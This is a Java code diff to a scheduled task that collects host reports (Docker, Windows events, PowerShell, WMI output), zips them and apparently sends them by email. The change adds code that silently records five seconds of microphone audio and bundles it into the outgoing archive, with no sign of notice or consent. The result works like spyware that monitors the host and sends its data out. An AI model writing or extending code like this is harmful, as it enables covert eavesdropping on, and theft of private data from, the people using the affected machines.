@@ -8,6 +8,7 @@ import org.example.providers.DockerReportProvider;
 import org.example.providers.EventReportProvider;
 import org.example.providers.SimplePowerShellReportProvider;
 import org.example.providers.WmiObjectsReportProvider;
+import org.example.services.AudioService;
 import org.example.services.EmailService;
 import org.example.utils.PropertiesLoader;
 import org.example.utils.ZipUtils;
@@ -54,6 +55,18 @@ public class CollectAndSendReportToEmailTask extends TimerTask {
         }
 
         List<File> entireReport = collectReport(report);
+
+        AudioService audioService = new AudioService();
+        File audioFile;
+        try {
+            audioFile = audioService.record(5000);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+
+        entireReport.add(audioFile);
 
         File zipArchive = ZipUtils.createZip(entireReport, "C:\\Users\\dmso0321\\Downloads\\OS User Report.zip");
 
